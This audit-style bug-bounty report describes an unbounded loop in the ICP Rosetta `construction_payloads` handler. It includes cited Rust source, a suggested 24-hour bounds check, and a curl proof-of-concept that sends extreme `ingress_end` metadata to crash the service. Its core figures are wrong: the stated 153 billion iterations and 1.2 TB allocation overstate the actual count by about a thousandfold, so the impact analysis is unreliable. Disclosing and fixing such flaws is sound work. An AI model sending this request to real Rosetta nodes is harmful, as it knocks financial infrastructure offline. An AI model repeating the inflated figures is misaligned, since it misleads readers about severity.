Audit Report

## Title
Unbounded `ingress_expiries` Loop Allows Single-Request OOM DoS in ICP Rosetta `construction_payloads` — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

## Summary
The ICP Rosetta handler's `construction_payloads` function accepts attacker-controlled `ingress_start` and `ingress_end` values from the JSON request body and passes them directly into an unbounded `while` loop that pushes a `u64` into a `Vec` on every 120-second step. With `ingress_start=0` and `ingress_end=u64::MAX`, the loop attempts to allocate on the order of 1.2 TB of memory, crashing the Rosetta process via OOM. No authentication is required to trigger this.

## Finding Description

**Root cause — no bounds validation before the loop.**

`ingress_start` and `ingress_end` are deserialized from the client-supplied JSON metadata as plain `u64` nanosecond timestamps with no range checking:

```rust
// rs/rosetta-api/icp/src/models.rs L200-223
pub struct ConstructionPayloadsRequestMetadata {
    pub ingress_start: Option<u64>,
    pub ingress_end:   Option<u64>,
    ...
}
``` [1](#0-0) 

`TryFrom<ObjectMap>` is a plain `serde_json::from_value` with no numeric bounds checking: [2](#0-1) 

The values are then used directly to drive the loop: [3](#0-2) 

The step size `interval` is:
```
MAX_INGRESS_TTL(5 min) - PERMITTED_DRIFT(1 min) - 120s = 120 s = 120_000_000_000 ns
``` [4](#0-3) [5](#0-4) 

With `ingress_start=0` and `ingress_end=u64::MAX` (18446744073709551615 ns), the loop iterates ≈153 billion times, each pushing an 8-byte `u64`, requiring ≈1.2 TB of heap allocation before the OS OOM-kills the process.

**No existing guard in the ICP handler.** The ICRC1 Rosetta handler has explicit pre-loop validation: [6](#0-5) 

The ICP handler has no analogous check anywhere between metadata parsing and the loop entry at line 101.

**The endpoint is public and unauthenticated.** The actix-web route registration shows no authentication middleware: [7](#0-6) 

## Impact Explanation

A single unauthenticated HTTP POST to `/construction/payloads` with extreme `ingress_end` crashes the ICP Rosetta process. This constitutes an **application/platform-level DoS** against the ICP Rosetta node, which is an in-scope financial integration component (ICP ledger / Rosetta API). The impact matches the **High ($2,000–$10,000)** bounty tier: "Application/platform-level DoS, crash … or subnet availability impact not based on raw volumetric DDoS" and "Significant … Rosetta … security impact with concrete user or protocol harm." The attack is non-volumetric (single request), deterministic, and repeatable — the process will be killed and any in-flight transaction submissions will be lost.

## Likelihood Explanation

The `/construction/payloads` endpoint requires no credentials, API keys, or prior session state. Any network-reachable client can send a single crafted JSON body. The exploit is deterministic: the loop always runs to OOM given the supplied values. The attacker needs only knowledge of the Rosetta API schema (publicly documented). Repeatability is unlimited — the process can be crashed again immediately after restart.

## Recommendation

Add an upper-bound guard on the ingress window before entering the loop, mirroring the ICRC1 pattern. For example, immediately after computing `ingress_end` (line 84), insert:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 60 * 60); // 24 hours
if ingress_end > ingress_start + MAX_INGRESS_WINDOW {
    return Err(ApiError::invalid_request(
        "ingress_end exceeds maximum allowed ingress window (24 hours)",
    ));
}
if ingress_start >= ingress_end {
    return Err(ApiError::invalid_request(
        "ingress_start must be before ingress_end",
    ));
}
```

A 24-hour window at 120-second intervals yields at most 720 entries (~5.8 KB), which is safe. Alternatively, cap `ingress_expiries` to a fixed maximum count and return an error if exceeded.

## Proof of Concept

```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [
      {"operation_identifier":{"index":0},"type":"TRANSACTION",
       "account":{"address":"<valid_src>"},
       "amount":{"value":"-100000000","currency":{"symbol":"ICP","decimals":8}}},
      {"operation_identifier":{"index":1},"type":"TRANSACTION",
       "account":{"address":"<valid_dst>"},
       "amount":{"value":"100000000","currency":{"symbol":"ICP","decimals":8}}}
    ],
    "public_keys":[{"hex_bytes":"<valid_pubkey>","curve_type":"edwards25519"}],
    "metadata":{
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

Expected: the process enters the loop at line 101, allocates memory unboundedly, and is terminated by the OS OOM killer before returning a response. A unit test can reproduce this safely by calling `RosettaRequestHandler::construction_payloads` directly with a mock ledger and the above metadata values, asserting that the call either returns an error or completes within a bounded time/memory budget.

### Citations

**File:** rs/rosetta-api/icp/src/models.rs (L200-223)
```rust
#[derive(Clone, Eq, PartialEq, Debug, Default, Deserialize, Serialize)]
pub struct ConstructionPayloadsRequestMetadata {
    /// The memo to use for a ledger transfer.
    /// A random number is used by default.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memo: Option<u64>,

    /// The earliest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_start: Option<u64>,

    /// The latest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_end: Option<u64>,

    /// If present, overrides ledger transaction creation time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created_at_time: Option<u64>,
}
```

**File:** rs/rosetta-api/icp/src/models.rs (L240-249)
```rust
impl TryFrom<ObjectMap> for ConstructionPayloadsRequestMetadata {
    type Error = ApiError;
    fn try_from(o: ObjectMap) -> Result<Self, ApiError> {
        serde_json::from_value(serde_json::Value::Object(o)).map_err(|e| {
            ApiError::internal_error(format!(
                "Could not parse ConstructionPayloadsRequestMetadata from Object: {e}"
            ))
        })
    }
}
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-107)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);

        let created_at_time: ic_ledger_core::timestamp::TimeStamp = meta
            .as_ref()
            .and_then(|meta| meta.created_at_time)
            .map(ic_ledger_core::timestamp::TimeStamp::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| std::time::SystemTime::now().into());

        // FIXME: the memo field needs to be associated with the operation
        let memo: Memo = meta
            .as_ref()
            .and_then(|meta| meta.memo)
            .map(Memo)
            .unwrap_or_else(|| Memo(rand::thread_rng().r#gen()));

        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/limits/src/lib.rs (L17-21)
```rust
pub const MAX_INGRESS_TTL: Duration = Duration::from_secs(5 * 60); // 5 minutes

/// Duration subtracted from `MAX_INGRESS_TTL` by
/// `expiry_time_from_now()` when creating an ingress message.
pub const PERMITTED_DRIFT: Duration = Duration::from_secs(60);
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L124-131)
```rust
#[post("/construction/payloads")]
async fn construction_payloads(
    msg: web::Json<ConstructionPayloadsRequest>,
    req_handler: web::Data<RosettaRequestHandler>,
) -> HttpResponse {
    let res = req_handler.construction_payloads(msg.into_inner());
    to_rosetta_response(res, &req_handler.rosetta_metrics())
}
```
